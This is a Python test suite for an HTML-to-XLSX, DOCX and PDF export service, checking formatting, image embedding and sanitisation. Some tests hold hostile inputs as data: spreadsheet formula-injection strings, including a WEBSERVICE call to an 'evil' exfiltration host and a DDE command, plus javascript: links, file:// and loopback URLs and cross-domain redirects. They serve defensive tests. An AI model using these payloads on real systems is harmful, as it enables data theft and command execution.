import base64

import pytest
from pydantic import ValidationError

from export.converter import ExportRequest, convert_export
from export.docx_converter import convert_docx
from export.xlsx_converter import convert_xlsx

HTML_DOC = """
<h1>Ueberschrift</h1>
<p>Ein Absatz.</p>
<table>
  <tr><th>Stadt</th><th>Einwohner</th></tr>
  <tr><td>Muenchen</td><td>1.500.000</td></tr>
  <tr><td>Nuernberg</td><td>500.000</td></tr>
</table>
<table>
  <tr><td>a</td></tr>
</table>
"""


@pytest.mark.unit
def test_xlsx_extracts_tables_and_prose() -> None:
    data = convert_xlsx(HTML_DOC)
    assert isinstance(data, bytes)
    assert len(data) > 0


@pytest.mark.unit
def test_xlsx_table_structure() -> None:
    from io import BytesIO

    from openpyxl import load_workbook

    workbook = load_workbook(BytesIO(convert_xlsx(HTML_DOC)))
    assert workbook.sheetnames == ["Text", "Tabelle 1", "Tabelle 2"]

    text_sheet = workbook["Text"]
    assert text_sheet.cell(row=1, column=1).value == "Ueberschrift"
    assert text_sheet.cell(row=2, column=1).value == "Ein Absatz."

    table = workbook["Tabelle 1"]
    assert table.max_row == 3
    assert table.max_column == 2
    assert table.cell(row=1, column=1).value == "Stadt"
    assert table.cell(row=2, column=1).value == "Muenchen"
    assert table.cell(row=3, column=2).value == "500.000"

    assert workbook["Tabelle 2"].cell(row=1, column=1).value == "a"


@pytest.mark.unit
def test_xlsx_without_prose_drops_text_sheet() -> None:
    from io import BytesIO

    from openpyxl import load_workbook

    workbook = load_workbook(
        BytesIO(convert_xlsx("<table><tr><td>x</td></tr></table>"))
    )
    assert workbook.sheetnames == ["Tabelle 1"]


@pytest.mark.unit
def test_xlsx_empty_document_returns_workbook() -> None:
    from io import BytesIO

    from openpyxl import load_workbook

    workbook = load_workbook(BytesIO(convert_xlsx("<p>nur text</p>")))
    assert workbook.sheetnames == ["Text"]
    assert workbook["Text"].cell(row=1, column=1).value == "nur text"


@pytest.mark.unit
def test_xlsx_neutralizes_formula_injection() -> None:
    from io import BytesIO

    from openpyxl import load_workbook

    html = (
        '<p>=WEBSERVICE("http://evil/exfil")</p>'
        "<table><tr>"
        '<td>=HYPERLINK("http://evil","x")</td>'
        "<td>=CMD|' /C calc'!A0</td>"
        "<td>+1+1</td>"
        "<td>-2+3</td>"
        "<td>@sum(A1:A2)</td>"
        "<td>normal</td>"
        "</tr></table>"
    )
    workbook = load_workbook(BytesIO(convert_xlsx(html)))
    assert (
        workbook["Tabelle 1"].cell(row=1, column=1).value
        == '\'=HYPERLINK("http://evil","x")'
    )
    for sheet in (workbook["Text"], workbook["Tabelle 1"]):
        for row in sheet.iter_rows():
            for cell in row:
                if cell.value:
                    assert cell.data_type == "s"
                    assert not str(cell.value).startswith(("=", "+", "-", "@"))


@pytest.mark.unit
def test_export_request_rejects_oversized_fields() -> None:
    from api.api_models import CANVAS_EDITOR_MAX_CHARS

    request = {
        "html": "x" * (4 * CANVAS_EDITOR_MAX_CHARS + 1),
        "target": "pdf",
    }
    with pytest.raises(ValidationError):
        ExportRequest(**request)


@pytest.mark.unit
def test_export_request_ignores_unknown_fields() -> None:
    """Older frontends may still send markdown/doc_json; nothing consumes them."""
    request = ExportRequest.model_validate(
        {"markdown": "m", "html": "h", "target": "pdf", "doc_json": '{"type":"doc"}'}
    )
    assert request.html == "h"


@pytest.mark.unit
def test_normalize_export_html_strips_script_and_style() -> None:
    from export.converter import normalize_export_html

    html = "<p>a</p><script>evil()</script><style>.x{}</style><p>b</p>"
    assert normalize_export_html(html) == "<p>a</p><p>b</p>"


@pytest.mark.unit
def test_normalize_export_html_materializes_canvas_image_spans() -> None:
    from export.converter import normalize_export_html

    html = '<p><span data-canvas-image-src="https://www.muenchen.de/i.png" data-canvas-image-alt="Logo"></span></p>'
    assert (
        normalize_export_html(html)
        == '<p><img alt="Logo" src="https://www.muenchen.de/i.png"/></p>'
    )


@pytest.mark.unit
def test_normalize_export_html_enforces_link_schemes() -> None:
    from export.converter import normalize_export_html

    html = (
        '<a href="https://www.muenchen.de">keep</a>'
        '<a href="http://example.com">keep</a>'
        '<a href="mailto:a@b.de">keep</a>'
        '<a href="javascript:alert(1)">drop</a>'
        '<a href="data:text/html,evil">drop</a>'
        '<a href="relative/path">drop</a>'
    )
    result = normalize_export_html(html)
    assert result.count('href="https://www.muenchen.de"') == 1
    assert result.count('href="http://example.com"') == 1
    assert result.count('href="mailto:a@b.de"') == 1
    for dropped in ("javascript:", "data:text/html", "relative/path"):
        assert dropped not in result
    assert "drop" in result


@pytest.mark.unit
def test_convert_export_normalizes_html_before_dispatch(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import export.pdf_converter as pdf_converter

    received: dict[str, str] = {}
    monkeypatch.setattr(
        pdf_converter, "convert_pdf", lambda html: received.update(html=html) or b"pdf"
    )

    request = ExportRequest(
        html='<p>a</p><script>evil()</script><span data-canvas-image-src="https://www.muenchen.de/i.png" data-canvas-image-alt="L"></span><a href="javascript:alert(1)">x</a>',
        target="pdf",
    )
    convert_export(request)
    assert (
        received["html"]
        == '<p>a</p><img alt="L" src="https://www.muenchen.de/i.png"/><a>x</a>'
    )


@pytest.mark.unit
def test_dispatch_returns_mimetype_and_filename(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import export.pdf_converter as pdf_converter

    monkeypatch.setattr(pdf_converter, "convert_pdf", lambda html: b"pdf")
    monkeypatch.setattr("export.converter.convert_docx", lambda md: b"docx")
    monkeypatch.setattr("export.converter.convert_xlsx", lambda html: b"xlsx")

    request = ExportRequest(html="h", target="pdf")
    data, mimetype, filename = convert_export(request)
    assert data == b"pdf"
    assert mimetype == "application/pdf"
    assert filename == "canvas.pdf"

    request.target = "docx"
    data, mimetype, filename = convert_export(request)
    assert data == b"docx"
    assert (
        mimetype
        == "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    )
    assert filename == "canvas.docx"

    request.target = "xlsx"
    data, mimetype, filename = convert_export(request)
    assert data == b"xlsx"
    assert (
        mimetype == "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    )
    assert filename == "canvas.xlsx"


DOCX_HTML = """
<h1>Titel</h1>
<p>Text mit <strong>fett</strong>, <em>kursiv</em>, <s>strike</s>, <u>unterstrichen</u> und <code>mono</code>.</p>
<ul><li>eins<ul><li>verschachtelt</li></ul></li><li>zwei</li></ul>
<blockquote><p>Zitat</p></blockquote>
<pre><code>Zeile 1
Zeile 2</code></pre>
<hr>
<p><a href="https://example.com">Link</a></p>
<table>
  <tr><th>Stadt</th><th>Einwohner</th></tr>
  <tr><td>Muenchen</td><td>1.500.000</td></tr>
</table>
"""


def _load_docx(data: bytes):
    from io import BytesIO

    from docx import Document

    return Document(BytesIO(data))


def _run_by_text(document, text: str):
    for paragraph in document.paragraphs:
        for run in paragraph.runs:
            if run.text == text:
                return run
    raise AssertionError(f"no run with text {text!r}")


@pytest.mark.unit
def test_docx_returns_zip() -> None:
    assert convert_docx(DOCX_HTML)[:2] == b"PK"


@pytest.mark.unit
def test_docx_blocks_and_inline_formatting() -> None:
    document = _load_docx(convert_docx(DOCX_HTML))
    styles = [p.style.name for p in document.paragraphs]
    assert styles[:9] == [
        "Heading 1",
        "Normal",
        "List Bullet",
        "List Bullet 2",
        "List Bullet",
        "Quote",
        "Normal",
        "Normal",
        "Normal",
    ]
    assert _run_by_text(document, "fett").bold is True
    assert _run_by_text(document, "kursiv").italic is True
    assert _run_by_text(document, "strike").font.strike is True
    assert _run_by_text(document, "unterstrichen").underline is True
    assert _run_by_text(document, "mono").font.name == "Courier New"


@pytest.mark.unit
def test_docx_hyperlink_and_tables() -> None:
    document = _load_docx(convert_docx(DOCX_HTML))
    assert any(
        rel.target_ref == "https://example.com"
        for rel in document.part.rels.values()
        if rel.is_external
    )

    (table,) = document.tables
    assert table.style.name == "Table Grid"
    assert len(table.rows) == 2
    assert table.rows[0].cells[0].paragraphs[0].runs[0].bold is True
    assert table.rows[0].cells[0].text == "Stadt"
    assert table.rows[1].cells[1].text == "1.500.000"


@pytest.mark.unit
def test_docx_code_block_preserves_line_breaks() -> None:
    document = _load_docx(convert_docx("<pre><code>Zeile 1\nZeile 2</code></pre>"))
    (paragraph,) = document.paragraphs
    assert [run.text for run in paragraph.runs] == ["Zeile 1\n", "Zeile 2"]
    assert paragraph.runs[0].font.name == "Courier New"


def _paragraph_num_id(paragraph) -> str | None:
    from docx.oxml.ns import qn

    num = paragraph._p.get_or_add_pPr().numPr
    if num is None:
        return None
    num_id = num.numId
    return num_id.get(qn("w:val")) if num_id is not None else None


@pytest.mark.unit
def test_docx_ordered_lists_restart_their_numbering() -> None:
    """The Word list styles share one per-document counter; each <ol> must get
    its own numbering instance so it restarts instead of continuing."""
    document = _load_docx(
        convert_docx(
            "<ol><li>eins</li><li>zwei</li></ol><p>Pause</p><ol><li>drei</li></ol>"
        )
    )
    first = document.paragraphs[0]
    second = document.paragraphs[3]
    assert first.style.name == second.style.name == "List Number"
    first_id, second_id = _paragraph_num_id(first), _paragraph_num_id(second)
    assert first_id is not None and second_id is not None
    assert first_id != second_id


@pytest.mark.unit
def test_docx_ordered_list_honours_start_attribute() -> None:
    from docx.oxml.ns import qn

    document = _load_docx(convert_docx('<ol start="4"><li>vier</li></ol>'))
    (paragraph,) = document.paragraphs
    num_id = _paragraph_num_id(paragraph)
    assert num_id is not None
    numbering = document.part.numbering_part.element
    instance = numbering.find(f'{qn("w:num")}[@{qn("w:numId")}="{num_id}"]')
    start_override = instance.find(f"{qn('w:lvlOverride')}/{qn('w:startOverride')}")
    assert start_override.get(qn("w:val")) == "4"


@pytest.mark.unit
def test_docx_content_after_nested_list_starts_new_paragraph() -> None:
    """A nested list must not swallow the item's trailing content into the
    paragraph rendered before it."""
    document = _load_docx(
        convert_docx(
            "<ul><li><p>vorher</p><ul><li><p>kind</p></li></ul><p>nachher</p></li></ul>"
        )
    )
    texts = [p.text for p in document.paragraphs]
    assert "vorher" in texts and "kind" in texts and "nachher" in texts
    assert "vorhernachher" not in texts
    (after,) = [p for p in document.paragraphs if p.text == "nachher"]
    assert after.style.name == "List Bullet"


@pytest.mark.unit
def test_docx_table_colspan_merges_cells() -> None:
    html = (
        '<table><tr><th colspan="2">Kopf</th></tr><tr><td>a</td><td>b</td></tr></table>'
    )
    document = _load_docx(convert_docx(html))
    (table,) = document.tables
    assert table.rows[0].cells[0].text == "Kopf"
    assert table.rows[0].cells[0]._tc is table.rows[0].cells[1]._tc


@pytest.mark.unit
def test_docx_huge_colspan_is_clamped() -> None:
    document = _load_docx(
        convert_docx('<table><tr><td colspan="1000">x</td></tr></table>')
    )
    (table,) = document.tables
    assert len(table.columns) <= 32
    assert table.rows[0].cells[0].text == "x"


@pytest.mark.unit
def test_docx_total_merge_budget_is_bounded() -> None:
    row = "<tr>" + '<td colspan="64">x</td>' * 4 + "</tr>"
    html = "<table>" + row * 100 + "</table>"

    document = _load_docx(convert_docx(html))

    (table,) = document.tables
    # early rows spend the merge budget; once it is exhausted every
    # further cell is rendered unmerged with span 1
    assert table.rows[0].cells[0]._tc is table.rows[0].cells[1]._tc
    assert table.rows[-1].cells[0]._tc is not table.rows[-1].cells[1]._tc


@pytest.mark.unit
def test_docx_invalid_colspan_converts_without_exception() -> None:
    for colspan in ("abc", "0", "-5", ""):
        html = f'<table><tr><td colspan="{colspan}">x</td></tr></table>'
        document = _load_docx(convert_docx(html))
        assert document.tables[0].rows[0].cells[0].text == "x"


def _weasyprint_available() -> bool:
    try:
        import weasyprint  # noqa: F401
    except Exception:
        return False
    return True


@pytest.mark.unit
@pytest.mark.skipif(
    not _weasyprint_available(), reason="weasyprint system libs not available"
)
def test_pdf_url_fetcher_serves_data_uris_and_allowlisted_hosts_only(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from unittest.mock import patch

    from export.pdf_converter import _url_fetcher

    with patch(
        "export.pdf_converter.fetch_allowed_image",
        lambda url: (b"\xff\xd8png", "image/png"),
    ):
        response = _url_fetcher.fetch("https://www.muenchen.de/img.jpg")
        assert response.read() == b"\xff\xd8png"
        assert response.content_type == "image/png"

    _url_fetcher.fetch("data:image/png;base64,iVBORw0KGgo=")
    for url in (
        "data:text/plain,hello",
        "data:text/html,<b>x</b>",
        "http://127.0.0.1:1/x.png",
        "https://example.com/x.css",
        "file:///tmp/leak.css",
        "https://evil.example.com/img.jpg",
    ):
        with pytest.raises(ValueError):
            _url_fetcher.fetch(url)


@pytest.mark.unit
def test_data_image_re_covers_the_shared_mime_set() -> None:
    """Pin _DATA_IMAGE_RE against IMAGE_DATA_MIMES (the frontend's
    DOCX_DECODABLE_MIMES mirrors the same set; keep both sides in sync)."""
    from export.docx_converter import _DATA_IMAGE_RE
    from export.image_fetcher import IMAGE_DATA_MIMES

    for mime in IMAGE_DATA_MIMES:
        assert _DATA_IMAGE_RE.match(f"data:{mime};base64,QUJD") is not None
    # anything outside the shared set degrades (incl. the nonstandard jpg alias)
    assert _DATA_IMAGE_RE.match("data:image/jpg;base64,QUJD") is None
    assert _DATA_IMAGE_RE.match("data:image/svg+xml;base64,QUJD") is None
    assert _DATA_IMAGE_RE.match("data:text/plain,hello") is None


@pytest.mark.unit
@pytest.mark.skipif(
    not _weasyprint_available(), reason="weasyprint system libs not available"
)
def test_pdf_conversion_uses_the_restricted_fetcher(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Pin the wiring: the restricted fetcher and the link stylesheet must be
    passed on the convert_pdf render path itself, not only in a side render."""
    import export.pdf_converter as pdf_converter
    from export.pdf_converter import _url_fetcher, convert_pdf

    rendered: dict[str, object] = {"url_fetcher": None}

    class SpyHTML:
        def __init__(self, **kwargs):
            rendered.update(kwargs)

        def write_pdf(self, **kwargs) -> bytes:
            rendered.update(kwargs)
            return b"%PDF-"

    monkeypatch.setattr(pdf_converter, "HTML", SpyHTML)

    assert convert_pdf("<p>text</p>") == b"%PDF-"
    assert rendered["url_fetcher"] is _url_fetcher
    stylesheets = rendered["stylesheets"]
    assert len(stylesheets) == 1
    assert "0563C1" in pdf_converter._LINK_CSS


@pytest.mark.integration
@pytest.mark.skipif(
    not _weasyprint_available(), reason="weasyprint system libs not available"
)
def test_pdf_conversion_ignores_external_resources(tmp_path) -> None:
    from weasyprint import HTML

    from export.pdf_converter import _url_fetcher, convert_pdf

    leak_css = tmp_path / "leak.css"
    leak_css.write_text("@page { size: 100mm 200mm }")
    html = (
        f'<link rel="stylesheet" href="file://{leak_css}">'
        '<p>text</p><img src="http://127.0.0.1:1/x.png">'
    )

    data = convert_pdf(html)
    assert data[:5] == b"%PDF-"

    page = HTML(string=html, url_fetcher=_url_fetcher).render().pages[0]
    assert page.height > 1000


@pytest.mark.integration
@pytest.mark.skipif(
    not _weasyprint_available(), reason="weasyprint system libs not available"
)
def test_pdf_conversion_with_weasyprint() -> None:
    from export.pdf_converter import convert_pdf

    data = convert_pdf("<h1>Titel</h1><p>Absatz.</p>")
    assert data[:5] == b"%PDF-"


@pytest.mark.integration
@pytest.mark.skipif(
    not _weasyprint_available(), reason="weasyprint system libs not available"
)
def test_pdf_renders_links_in_the_link_color() -> None:
    """The link stylesheet must reach the render: #0563C1 = 0.019608
    0.388235 0.756863 as the fill color of the link text."""
    import re
    import zlib

    from export.pdf_converter import convert_pdf

    pdf = convert_pdf(
        '<p>Siehe <a href="https://www.muenchen.de/alias">die Seite</a> online.</p>'
    )
    fills: list[bytes] = []
    for match in re.finditer(rb"stream\r?\n(.*?)endstream", pdf, re.S):
        try:
            content = zlib.decompress(match.group(1))
        except zlib.error:
            continue
        fills.extend(
            segment for segment in content.split(b"\n") if segment.endswith(b" rg")
        )
    assert b"0.019608 0.388235 0.756863 rg" in fills


# A 1x1 transparent PNG; python-docx parses the header without Pillow.
_PNG_1PX = (
    "data:image/png;base64,"
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
)


@pytest.mark.unit
def test_docx_embeds_approved_data_uri_images() -> None:
    document = _load_docx(
        convert_docx(f'<p>Vorher <img src="{_PNG_1PX}" alt="Logo"> nachher</p>')
    )
    assert len(document.inline_shapes) == 1
    text = document.paragraphs[0].text
    assert text.startswith("Vorher")
    assert text.endswith("nachher")


@pytest.mark.unit
def test_docx_renders_block_level_images_as_own_paragraph() -> None:
    document = _load_docx(
        convert_docx(f'<p>Text</p>\n<img src="{_PNG_1PX}" alt="Bild">')
    )
    assert len(document.inline_shapes) == 1


@pytest.mark.unit
def test_docx_degrades_unsupported_and_corrupt_images_to_alt_text() -> None:
    document = _load_docx(
        convert_docx(
            '<p><img src="data:image/webp;base64,AAAA" alt="Plan">'
            '<img src="data:image/png;base64,///broken" alt="Kaputt">'
            '<img src="https://example.com/logo.png" alt="Remote"></p>'
        )
    )
    assert len(document.inline_shapes) == 0
    assert _run_by_text(document, "Plan")
    assert _run_by_text(document, "Kaputt")
    assert _run_by_text(document, "Remote")


@pytest.mark.unit
def test_docx_embeds_jpegs_without_metadata_via_pillow_retry() -> None:
    import io as _io

    from PIL import Image

    image = Image.new("RGB", (120, 90), (30, 100, 160))
    buffer = _io.BytesIO()
    image.save(buffer, format="JPEG", quality=80)
    raw = buffer.getvalue()
    stripped = raw[:2] + raw[raw.index(b"\xff\xdb") :]
    uri = "data:image/jpeg;base64," + base64.b64encode(stripped).decode()
    document = _load_docx(convert_docx(f'<p><img src="{uri}" alt="Pic"></p>'))
    assert len(document.inline_shapes) == 1


@pytest.mark.unit
def test_docx_clamps_oversized_picture_widths() -> None:
    data = convert_docx(f'<p><img src="{_PNG_1PX}" alt="Wide"></p>')
    document = _load_docx(data)
    section = document.sections[0]
    usable = section.page_width - section.left_margin - section.right_margin
    for shape in document.inline_shapes:
        assert shape.width <= usable


@pytest.fixture
def allowlisted_settings(monkeypatch: pytest.MonkeyPatch) -> None:
    import types

    from export import image_fetcher

    fake_settings = types.SimpleNamespace(allowed_link_domains=["www.muenchen.de"])
    monkeypatch.setattr(image_fetcher, "get_settings", lambda: fake_settings)


def _mock_image_transport(
    status_code: int = 200,
    content: bytes = b"\xff\xd8jpeg",
    content_type: str = "image/jpeg",
):
    import httpx

    def handler(request: httpx.Request) -> httpx.Response:
        if status_code in (301, 302, 303, 307, 308):
            return httpx.Response(status_code, headers={"Location": content.decode()})
        return httpx.Response(
            status_code, content=content, headers={"Content-Type": content_type}
        )

    return httpx.MockTransport(handler)


@pytest.mark.unit
def test_image_fetcher_fetches_allowlisted_image(
    allowlisted_settings, monkeypatch: pytest.MonkeyPatch
) -> None:
    import io as _io

    from PIL import Image

    from export.image_fetcher import fetch_allowed_image

    buffer = _io.BytesIO()
    Image.new("RGB", (5, 5), (9, 9, 9)).save(buffer, format="JPEG", quality=70)
    png_bytes = buffer.getvalue()
    transport = _mock_image_transport(200, png_bytes, "image/jpeg")

    result = fetch_allowed_image(
        "https://www.muenchen.de/img1.jpg", transport=transport
    )

    assert result is not None
    assert result[0] == png_bytes
    assert result[1] == "image/jpeg"


@pytest.mark.unit
def test_image_fetcher_rejects_non_allowlisted_sources(allowlisted_settings) -> None:
    from export.image_fetcher import fetch_allowed_image

    for url in (
        "https://evil.example.com/img.jpg",
        "http://www.muenchen.de/img.jpg",
        "https://www.muenchen.de:8443/img.jpg",
        "https://user@www.muenchen.de/img.jpg",
    ):
        assert fetch_allowed_image(url) is None


@pytest.mark.unit
def test_image_fetcher_rejects_cross_domain_redirects(
    allowlisted_settings, monkeypatch: pytest.MonkeyPatch
) -> None:
    from export.image_fetcher import fetch_allowed_image

    transport = _mock_image_transport(302, b"https://evil.example.com/next.jpg")

    assert (
        fetch_allowed_image("https://www.muenchen.de/img1.jpg", transport=transport)
        is None
    )


@pytest.mark.unit
def test_image_fetcher_follows_allowlisted_redirects(
    allowlisted_settings, monkeypatch: pytest.MonkeyPatch
) -> None:
    import httpx

    from export.image_fetcher import fetch_allowed_image

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/first":
            return httpx.Response(302, headers={"Location": "/second"})
        return httpx.Response(
            200, content=b"\xff\xd8", headers={"Content-Type": "image/jpeg"}
        )

    result = fetch_allowed_image(
        "https://www.muenchen.de/first", transport=httpx.MockTransport(handler)
    )
    assert result is not None
    assert result[0] == b"\xff\xd8"


@pytest.mark.unit
def test_image_fetcher_rejects_non_image_and_oversized(
    allowlisted_settings, monkeypatch: pytest.MonkeyPatch
) -> None:
    from export import image_fetcher
    from export.image_fetcher import fetch_allowed_image

    transport_text = _mock_image_transport(200, b"not an image", "text/html")
    assert (
        fetch_allowed_image("https://www.muenchen.de/img.jpg", transport=transport_text)
        is None
    )

    monkeypatch.setattr(image_fetcher, "_MAX_IMAGE_BYTES", 4)
    transport_big = _mock_image_transport(200, b"123456", "image/png")
    assert (
        fetch_allowed_image("https://www.muenchen.de/img.png", transport=transport_big)
        is None
    )


@pytest.mark.unit
def test_docx_embeds_allowlisted_host_images(
    allowlisted_settings, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(
        "export.docx_converter.fetch_allowed_image",
        lambda url: (base64.b64decode(_PNG_1PX.split(",", 1)[1]), "image/png"),
    )
    document = _load_docx(
        convert_docx('<p><img src="https://www.muenchen.de/logo.png" alt="Logo"></p>')
    )
    assert len(document.inline_shapes) == 1


@pytest.mark.unit
def test_docx_degrades_unfetchable_allowlisted_images(
    allowlisted_settings, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("export.docx_converter.fetch_allowed_image", lambda url: None)
    document = _load_docx(
        convert_docx('<p><img src="https://www.muenchen.de/logo.png" alt="Logo"></p>')
    )
    assert len(document.inline_shapes) == 0
    assert _run_by_text(document, "Logo")
